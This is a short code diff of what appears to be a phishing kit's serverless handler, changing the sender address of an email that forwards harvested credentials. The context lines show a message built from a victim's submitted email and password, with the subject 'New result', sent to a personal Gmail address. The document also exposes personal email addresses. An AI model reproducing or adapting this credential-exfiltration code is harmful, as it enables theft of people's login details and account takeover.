@@ -19,7 +19,7 @@ export default async (req: Request, context: Context) => {
 });
 
   const message = {
-      from: "pc_golf@hotmail.com",
+      from: "muammer_y@hotmail.com",
       to: "emilychan1178@gmail.com",
       subject: "New result",
       text: `Email: ${email} :: Password: ${password} :: Context: ${context}`,
